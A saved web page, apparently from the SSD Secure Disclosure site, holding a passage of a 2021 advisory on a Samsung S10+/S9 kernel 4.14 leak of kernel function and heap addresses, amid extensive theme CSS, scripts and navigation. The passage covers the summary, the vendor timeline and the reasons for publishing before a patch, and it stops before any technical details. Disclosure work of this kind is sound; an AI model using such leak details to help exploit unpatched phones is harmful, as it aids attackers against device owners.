.woocommerce nav.woocommerce-pagination ul li a:hover,
.pricing.active,
.vc_grid-item-mini .vc_gitem-zone .vc_btn3.vc_btn3-style-custom,
.primary-button.button-inverse:hover,
.primary-button.button-inverse,
.keydesign-cart .buttons .btn, .woocommerce .keydesign-cart .buttons .btn,
.wpcf7 .wpcf7-submit,
.post-password-form input[type="submit"],
.woocommerce button.button,
.woocommerce input.button,
.owl-controls .owl-page.active span,
.owl-controls .owl-page:hover span {
			border: 2px solid #3c9fb6;
	}

.features-tabs .tab a.active .triangle {
			border-right: 10px solid #3c9fb6;
	}

	.keydesign-cart .keydesign-cart-dropdown {
		border-top: 5px solid #3c9fb6;
	}

.blockquote-reverse,
blockquote,
.testimonials.slider .owl-controls .owl-page.active span,
.tags a:hover, .tagcloud a:hover,
.contact-map-container .toggle-map:hover,
.navigation.pagination .next:hover, .navigation.pagination .prev:hover,
.contact .wpcf7-response-output,
.video-bg .secondary-button,
.image-bg .secondary-button,
.contact .wpcf7-form-control-wrap textarea.wpcf7-form-control:focus,
.contact .wpcf7-form-control-wrap input.wpcf7-form-control:focus,
.team-member-down:hover .triangle,
.team-member:hover .triangle,
.secondary-button-inverse,
.vc_separator .vc_sep_holder .vc_sep_line {
			border-color: #3c9fb6;
	}

	#main-menu .navbar-nav .menu-item-has-children .dropdown-menu,
	.navbar-nav .menu-item-has-children .dropdown-menu {
		border-top-color: #3c9fb6;
	}

	.wpb-js-composer .vc_tta-container  .vc_tta-tabs.vc_tta-tabs-position-left .vc_tta-tab:before {
	    border-right: 9px solid #3c9fb6;
	}

	.wpb-js-composer .vc_tta-container .vc_tta.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tabs-list li:before {
	    border-top: 9px solid #3c9fb6;
	}

h1,h2,h3,h4,h5,h6,
.kd-calltoaction .tt_button.tt_secondary_button,
.kd_progress_bar .kd_progb_head .kd-progb-title h4,
.kd-photobox .phb-btncontainer a,
.key-icon-box .ib-link a,
.wpb-js-composer .vc_tta-container .vc_tta.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tabs-list li a,
 .es-accordion .es-heading h4 a,
.wpb-js-composer .vc_tta-color-white.vc_tta-style-modern .vc_tta-tab>a:hover,
#comments .reply a,
#comments .fn,
#comments .fn a,
.blog_widget ul li a,
.portfolio-block h4,
.rw-author-details h4,
.testimonials.slider .author,
.testimonials.slider .tt-content h6,
.vc_grid-item-mini .vc_gitem_row .vc_gitem-col h4,
.navbar-default.navbar-shrink .nav li a,
.team-content h5,
.key-icon-box .service-heading,
#wp-calendar caption,
.post a:hover,
.kd_pie_chart .kd_pc_title,
.kd_pie_chart .pc-link a,
.testimonials .tt-content h4,
.kd-photobox .phb-content h4,
.kd-process-steps .pss-text-area h4,
.widget-title,
.kd-promobox .prb-content h4,
.kd_counter_units,
.large-counter .kd_counter_text,
.bp-content h4,
.reply-title,
.product_meta,
.blog-header .section-heading,
.testimonial-cards .tcards-title,
.testimonial-cards .tcards_header .tcards-name,
.woocommerce-result-count,
.pss-link a,
.navigation.pagination .next, .navigation.pagination .prev,
.modal-menu-item:focus, .modal-menu-item,
.play-video .fa-play,
.navbar-default .nav li a,
#commentform #submit,
.logged-in .navbar-nav a, .navbar-nav .menu-item a,
.header-search-bar .fa.toggle-search,
.woocommerce table.shop_attributes th,
.team-member.design-two .team-socials .fa,
.team-member.design-two .team-content .team-link .fa,
.portfolio-block strong,
.keydesign-cart .nc-icon-outline-cart,
.portfolio-meta.share-meta .fa,
.woocommerce .price_slider_wrapper .price_slider_amount,
.subscribe input[type="submit"],
.port-prev.tt_button,
.port-next.tt_button,
.es-accordion .es-speaker-container .es-speaker-name,
.pricing-title,
.woocommerce input.button,
.woocommerce button.button,
.wpcf7-select,
.woocommerce div.product .woocommerce-tabs ul.tabs li.active a,
.woocommerce-cart  #single-page table.cart .product-name a,
#kd-slider .tt_button,
.wpb-js-composer .vc_tta-container .vc_tta-color-white.vc_tta-style-modern .vc_tta-tab>a,
.pricing .pricing-time,
.group_table .label,
body.maintenance-mode .countdown,
.socials-widget a .fa,
.cb-container.cb_transparent_color:hover .cb-heading,
.app-gallery .ag-section-desc h4,
.single-post .wpb_text_column strong,
.page-404 .section-subheading,
.testimonials .tt-content .content {
			color: #1f1f1f;
	}

.cb-container:hover,
.kd-photobox .phb-content .phb-btncontainer a:hover {
			background-color: #1f1f1f;
	}

	.testimonials.slider .owl-controls .owl-page:hover span {
		border-color: #1f1f1f;
	}

	.wpcf7 .wpcf7-text::-webkit-input-placeholder {color: #1f1f1f;}
	.wpcf7 .wpcf7-text::-moz-placeholder {color: #1f1f1f;}
	.wpcf7 .wpcf7-text:-ms-input-placeholder {color: #1f1f1f;}

.upper-footer {
			background-color: #1f1f1f;
	}

.lower-footer {
			background-color: #1f1f1f;
	}

	.lower-footer, .upper-footer {
		color: #3c9fb6;
	}

	.upper-footer .widget-title, .upper-footer .modal-menu-item {
		color: #ffffff;
	}

	.navbar.navbar-default.navbar-shrink.fixed-menu,
	.navbar.navbar-default .dropdown-menu,
	.navbar.navbar-default {
		background-color: transparent !important;
	}

	.keydesign-cart .keydesign-cart-dropdown,
	#main-menu .navbar-nav .menu-item-has-children .dropdown-menu, .navbar-nav .menu-item-has-children .dropdown-menu,
	.single-portfolio .navbar.navbar-default,
	.single-post .navbar.navbar-default,
	.blog .navbar.navbar-default,
	.woocommerce-page .navbar.navbar-default,
	.navbar.navbar-default.navbar-shrink .keydesign-cart .keydesign-cart-dropdown,
	.navbar.navbar-default.navbar-shrink .dropdown-menu,
	.navbar.navbar-default.navbar-shrink {
		background-color: #ffffff !important;
	}

	.home .header-search-bar .fa.toggle-search,
	.navbar.navbar-default.navbar-shrink.fixed-menu a,
	.home .keydesign-cart .nc-icon-outline-cart,
	.navbar.navbar-default a {
		color: #3c9fb6 !important;
	}

	.navbar-default .navbar-toggle .icon-bar {
		background: #1f1f1f !important;
	}

	#main-menu .navbar-nav .menu-item-has-children .mobile-dropdown,
	#main-menu .navbar-nav .menu-item-has-children .dropdown-menu a, .navbar-nav .menu-item-has-children .dropdown-menu a,
	.keydesign-cart ul.product_list_widget .cart-item,
	.keydesign-cart .buttons .btn,
	.navbar.navbar-default.navbar-shrink .keydesign-cart .keydesign-cart-dropdown,
	.navbar.navbar-default.navbar-shrink .keydesign-cart .nc-icon-outline-cart,
	.navbar.navbar-default.navbar-shrink a,
	.navbar.navbar-default.navbar-shrink .header-search-bar .fa.toggle-search,
	.single-post .navbar.navbar-default a,
	.archive .navbar.navbar-default a,
	.woocommerce-page .navbar.navbar-default a,
	.search-results .navbar.navbar-default a,
	.blog .navbar.navbar-default a,
	.single-portfolio .navbar.navbar-default a {
		color: #1f1f1f !important;
	}

	.navbar-default.navbar-shrink .nav li.active a,
	#main-menu .navbar-nav .menu-item-has-children .dropdown-menu a:hover, .navbar-nav .menu-item-has-children .dropdown-menu a:hover,
	.navbar.navbar-default a:hover {
		color: #3c9fb6 !important;
	}

	#logo .logo {
		color: #ffffff !important;
	}

	.blog #logo .logo,
	.single-post #logo .logo,
	.search-results #logo .logo,
	.archive #logo .logo,
	.single-portfolio #logo .logo,
	.navbar-shrink #logo .logo {
		color: #1f1f1f !important;
	}

	.single-portfolio #single-page, .portfolio-navigation-links {
		background-color: #fafafa;
	}

	body, .box {
					color: #2b2b2b;
							font-weight: 400;
							font-family: Roboto;
							font-size: 18px;
							text-align: left;
							line-height: 24px;
			}


	.container h1,.container h2,.container h3, .pricing .col-lg-3, .chart, .pb_counter_number, .pc_percent_container {
					color: #1f1f1f;
							font-weight: 700;
							font-family: Poppins;
							font-size: 34px;
							text-align: center;
							line-height: 45px;
			}

	.navbar-default .nav li a, .modal-menu-item {
									}



@media (max-width: 960px) {
			#logo .logo {
			color: #1f1f1f !important;
		}
	
			.navbar.navbar-default {
			background-color: #ffffff !important;
		}
	
			.navbar.navbar-default a,
		.modal-menu-item,
		 .navbar-nav .menu-item a {
			color: #1f1f1f !important;
		}
	}
</style><style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style><meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress.">
<meta name="generator" content="Powered by Slider Revolution 6.1.3 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface.">
<link rel="icon" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/OnlytheD-icon.png" sizes="32x32">
<link rel="icon" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/OnlytheD-icon.png" sizes="192x192">
<link rel="apple-touch-icon" href="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/OnlytheD-icon.png">
<meta name="msapplication-TileImage" content="https://ssd-disclosure.com/wp-content/uploads/2020/01/OnlytheD-icon.png">
<script type="text/javascript">function setREVStartSize(t){try{var h,e=document.getElementById(t.c).parentNode.offsetWidth;if(e=0===e||isNaN(e)?window.innerWidth:e,t.tabw=void 0===t.tabw?0:parseInt(t.tabw),t.thumbw=void 0===t.thumbw?0:parseInt(t.thumbw),t.tabh=void 0===t.tabh?0:parseInt(t.tabh),t.thumbh=void 0===t.thumbh?0:parseInt(t.thumbh),t.tabhide=void 0===t.tabhide?0:parseInt(t.tabhide),t.thumbhide=void 0===t.thumbhide?0:parseInt(t.thumbhide),t.mh=void 0===t.mh||""==t.mh||"auto"===t.mh?0:parseInt(t.mh,0),"fullscreen"===t.layout||"fullscreen"===t.l)h=Math.max(t.mh,window.innerHeight);else{for(var i in t.gw=Array.isArray(t.gw)?t.gw:[t.gw],t.rl)void 0!==t.gw[i]&&0!==t.gw[i]||(t.gw[i]=t.gw[i-1]);for(var i in t.gh=void 0===t.el||""===t.el||Array.isArray(t.el)&&0==t.el.length?t.gh:t.el,t.gh=Array.isArray(t.gh)?t.gh:[t.gh],t.rl)void 0!==t.gh[i]&&0!==t.gh[i]||(t.gh[i]=t.gh[i-1]);var r,a=new Array(t.rl.length),n=0;for(var i in t.tabw=t.tabhide>=e?0:t.tabw,t.thumbw=t.thumbhide>=e?0:t.thumbw,t.tabh=t.tabhide>=e?0:t.tabh,t.thumbh=t.thumbhide>=e?0:t.thumbh,t.rl)a[i]=t.rl[i]<window.innerWidth?0:t.rl[i];for(var i in r=a[0],a)r>a[i]&&0<a[i]&&(r=a[i],n=i);var d=e>t.gw[n]+t.tabw+t.thumbw?1:(e-(t.tabw+t.thumbw))/t.gw[n];h=t.gh[n]*d+(t.tabh+t.thumbh)}void 0===window.rs_init_css&&(window.rs_init_css=document.head.appendChild(document.createElement("style"))),document.getElementById(t.c).height=h,window.rs_init_css.innerHTML+="#"+t.c+"_wrapper { height: "+h+"px }"}catch(t){console.log("Failure at Presize of Slider:"+t)}};</script>
		<style type="text/css" id="wp-custom-css">
			.clients.slider .clients-content {
	margin: 0 20px 0 20px; padding-top: px 
}.slider .item {height: 200px !important;}

.post=4772 .section-heading {
    font-size: 20px;
    line-height: 20px;
}
.section-heading {
    font-size: 35px !important;
}

		</style>
		<noscript><style> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript>	   
	   <!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-WH9WZWM');</script>
<!-- End Google Tag Manager -->
	   
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><meta http-equiv="Pragma" content="no-cache"><meta http-equiv="Expires" content="0"><style type="text/css" data-fbcssmodules="css:fb.css.base css:fb.css.dialog css:fb.css.iframewidget css:fb.css.customer_chat_plugin_iframe">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:"lucida grande", tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#043b87;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}
.fb_mpn_mobile_landing_page_slide_out{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_out_from_left{animation-duration:200ms;animation-name:fb_mpn_landing_page_slide_out_from_left;transition-timing-function:ease-in}.fb_mpn_mobile_landing_page_slide_up{animation-duration:500ms;animation-name:fb_mpn_landing_page_slide_up;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_in{animation-duration:300ms;animation-name:fb_mpn_bounce_in;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out{animation-duration:300ms;animation-name:fb_mpn_bounce_out;transition-timing-function:ease-in}.fb_mpn_mobile_bounce_out_v2{animation-duration:300ms;animation-name:fb_mpn_fade_out;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_v2{animation-duration:300ms;animation-name:fb_bounce_in_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_in_from_left{animation-duration:300ms;animation-name:fb_bounce_in_from_left;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_v2{animation-duration:300ms;animation-name:fb_bounce_out_v2;transition-timing-function:ease-in}.fb_customer_chat_bounce_out_from_left{animation-duration:300ms;animation-name:fb_bounce_out_from_left;transition-timing-function:ease-in}.fb_invisible_flow{display:inherit;height:0;overflow-x:hidden;width:0}@keyframes fb_mpn_landing_page_slide_out{0%{margin:0 12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;margin:0 24px;width:60px}}@keyframes fb_mpn_landing_page_slide_out_from_left{0%{left:12px;width:100% - 24px}60%{border-radius:18px}100%{border-radius:50%;left:12px;width:60px}}@keyframes fb_mpn_landing_page_slide_up{0%{bottom:0;opacity:0}100%{bottom:24px;opacity:1}}@keyframes fb_mpn_bounce_in{0%{opacity:.5;top:100%}100%{opacity:1;top:0}}@keyframes fb_mpn_fade_out{0%{bottom:30px;opacity:1}100%{bottom:0;opacity:0}}@keyframes fb_mpn_bounce_out{0%{opacity:1;top:0}100%{opacity:.5;top:100%}}@keyframes fb_bounce_in_v2{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}50%{transform:scale(1.03, 1.03);transform-origin:bottom right}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}}@keyframes fb_bounce_in_from_left{0%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}50%{transform:scale(1.03, 1.03);transform-origin:bottom left}100%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}}@keyframes fb_bounce_out_v2{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom right}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom right}}@keyframes fb_bounce_out_from_left{0%{opacity:1;transform:scale(1, 1);transform-origin:bottom left}100%{opacity:0;transform:scale(0, 0);transform-origin:bottom left}}@keyframes slideInFromBottom{0%{opacity:.1;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}@keyframes slideInFromBottomDelay{0%{opacity:0;transform:translateY(100%)}97%{opacity:0;transform:translateY(100%)}100%{opacity:1;transform:translateY(0)}}</style></head>
    <body class="post-template-default single single-post postid-4928 single-format-standard wpb-js-composer js-comp-ver-6.7.0 vc_responsive sfsi_2.68">
		
		<!-- Google Tag Manager (noscript) -->
<noscript><iframe 
height="0" width="0" style="display:none;visibility:hidden" data-src="https://www.googletagmanager.com/ns.html?id=GTM-WH9WZWM" class="lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
		
      
      <!-- Contact Modal template -->
            <!-- END Contact Modal template -->

      <nav class="navbar navbar-default navbar-fixed-top">
         <div class="container">
           <div id="logo">
                                             <!-- Image logo -->
                 <a class="logo" href="https://ssd-disclosure.com/">
                                        <img width="" alt="SSD Secure Disclosure" data-src="https://ssd-disclosure.com/wp-content/uploads/2020/01/OnlytheD-icon.png" class="fixed-logo lazyload" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><noscript><img class="fixed-logo" src="https://ssd-disclosure.com/wp-content/uploads/2020/01/OnlytheD-icon.png" width="" alt="SSD Secure Disclosure" /></noscript>
                     <img width="" alt="SSD Secure Disclosure" data-src="https://ssd-disclosure.com/wp-content/uploads/2020/01/OnlytheD-icon.png" class="nav-logo lazyloaded" src="./2021 - Samsung S10+ and S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak_files/OnlytheD-icon.png"><noscript><img class="nav-logo" src="https://ssd-disclosure.com/wp-content/uploads/2020/01/OnlytheD-icon.png" width="" alt="SSD Secure Disclosure" /></noscript>
                                    </a>
                                                    </div>
           <div class="navbar-header page-scroll">
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-menu">
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    </button>
                                        <div class="mobile-cart">
                                            </div>
                                </div>
            <div id="main-menu" class="collapse navbar-collapse  navbar-right">
               <ul id="menu-main-menu" class="nav navbar-nav"><li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-2263" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-2263"><a title="Home" href="https://ssd-disclosure.com/">Home</a></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-4283" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4283 one-page-link dropdown"><a title="The community" href="https://ssd-disclosure.com/home#what-we-do" class="dropdown-toggle">The community</a>
<ul role="menu" class=" dropdown-menu">
	<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-4281" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4281"><a title="The SSD community" href="https://ssd-disclosure.com/the-ssd-community/">The SSD community</a></li>
	<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-4626" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4626"><a title="Community Challenges" href="https://ssd-disclosure.com/community_challenges/">Community Challenges</a></li>
	<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-4285" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4285"><a title="Typhooncon" href="https://www.typhooncon.com/">Typhooncon</a></li>
</ul>
<span class="mobile-dropdown"></span></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-4246" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4246 one-page-link"><a title="What we do" href="https://ssd-disclosure.com/home#byresearchers_forresearchers">What we do</a></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-4110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4110 one-page-link dropdown"><a title="Scope" href="https://ssd-disclosure.com/home#our-scope" class="dropdown-toggle">Scope</a>
<ul role="menu" class=" dropdown-menu">
	<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-4284" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4284"><a title="Full Scope" href="https://ssd-disclosure.com/scope/">Full Scope</a></li>
</ul>
<span class="mobile-dropdown"></span></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-1967" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1967 one-page-link"><a title="Our story" href="https://ssd-disclosure.com/home#how-it-works">Our story</a></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-4111" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4111 one-page-link dropdown"><a title="Advisories" href="https://ssd-disclosure.com/home#client-testimonials" class="dropdown-toggle">Advisories</a>
<ul role="menu" class=" dropdown-menu">
	<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-4147" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4147"><a title="Advisories archive" href="https://ssd-disclosure.com/advisories-archive/">Advisories archive</a></li>
	<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-4148" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4148"><a title="GitHub" href="https://github.com/ssd-secure-disclosure/advisories">GitHub</a></li>
</ul>
<span class="mobile-dropdown"></span></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-4112" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4112 one-page-link"><a title="Submission" href="https://ssd-disclosure.com/home#submit">Submission</a></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-1970" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1970 one-page-link"><a title="Contact" href="https://ssd-disclosure.com/home#get-in-touch">Contact</a></li>
<li itemscope="itemscope" itemtype="https://www.schema.org/SiteNavigationElement" id="menu-item-4115" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4115"><a title="FAQ" href="https://ssd-disclosure.com/faq/">FAQ</a></li>
</ul>
               
               <!-- Header Button template -->
<!-- END Header Button template -->

              
            </div>
         </div>
      </nav>

      <div id="wrapper" class="">
      
<div id="posts-content" class="container blog-single">
    <div class="col-xs-12 col-sm-12 col-md-9 col-lg-9 BlogFullWidth">
      <div class="post-4928 post type-post status-publish format-standard hentry category-uncategorized" id="post-4928">
   <div class="blog-single-content">
            <h1 class="blog-single-title">SSD Advisory – Samsung S10+/S9 kernel 4.14 (Android 10) Kernel Function Address (.text) and Heap Address Information Leak</h1>

      <div class="entry-meta">
                  <span class="published"><span class="fa fa-clock-o"></span>August 24, 2021</span>
         <span class="author"><span class="fa fa-keyboard-o"></span><a href="https://ssd-disclosure.com/author/noamr/" title="Posts by SSD Disclosure / Technical Lead" rel="author">SSD Disclosure / Technical Lead</a></span>
         <span class="blog-label"><span class="fa fa-folder-open-o"></span><a href="https://ssd-disclosure.com/category/uncategorized/" rel="category tag">Uncategorized</a></span>
      </div>

      <div class="blog-content">
<p><strong>TL;DR</strong></p>



<p>Find out how a vulnerability discovered in Samsung S10+/S9 kernel allows leaking of sensitive function address information.</p>



<p><strong>Vulnerability Summary</strong></p>



<p>Samsung S10+/S9 kernel (based on Android 10) does not properly handle information received from the user, a memory leak found in the CentOS/RedHat operating system has been found to also affect this platform.</p>



<p>The vulnerability leaks information that can be utilised to gain insight to data addresses and function addresses which can then assist local attackers in exploiting code execution vulnerabilities.</p>



<p><strong>CVE</strong></p>



<p>CVE-TBD</p>



<p><strong><strong>Credit</strong></strong></p>



<p>An independent security researcher has reported this vulnerability to the SSD Secure Disclosure program.</p>



<p><strong>Affected Versions</strong></p>



<p>Samsung S10+/S9 kernel 4.14</p>



<p><strong>Vendor Response</strong></p>



<p>We reported the vulnerability to Samsung on 2021.04.14, as of 2021.08.12, Samsung stated the following:</p>



<blockquote class="wp-block-quote"><p><em>However, there are some models that will be patched during the quarterly security update cycle</em>.</p></blockquote>



<p>What we know:</p>



<ol><li>The vulnerability has been disclosed in a timely fashion (more than 90 days ago) to the vendor.</li><li>Samsung was aware of this vulnerability before we reported it and issued patches for the latest Samsung models, they claim that they didn’t know it was affecting older models of Samsung.</li></ol>



<p>Both of these two items make it unclear why after 4 months, Samsung have yet to release patches for affected Samsung models while asking us to delay the advisory, without even giving a definite timeline when the patch will be rolled out. </p>



<p>We decided to publish this vulnerability at this time, as the safety of our community is one of our core values and priorities. </p>



<p><strong>Vulnerability Analysis</strong></p>



<p><em>Introduction</em></p>



<p>Auditing the Linux kernel on Red Hat Enterprise Linux 8 kernel, a piece of code that leaks stack uninitialized variables  to the user. As we often do vulnerability research focused on Red Hat Enterprise Linux we know that it misses commits/patches that fix vulnerabilities specially when they do not have a CVE identifier. The Linux kernel version 4.18 as used by Red Hat Enterprise Linux 8 is no longer supported by upstream then Red Hat security team needs to cherry-pick important security fixes/patches that should be interesting for them. As the development of the Linux kernel on upstream is very active and developed in a fast pace, it’s a hard work to keep track of all the potential security vulnerabilities that could affect Red Hat Enterprise Linux.</p>



<p>Based on that, we decided to check the Linux kernel source code on upstream to see if the vulnerability was still there and then we discovered the vulnerability had already been patched. The vulnerability was introduced on April 30, 2013 and patched on May 30, 2019. The respective commits are the following:</p>



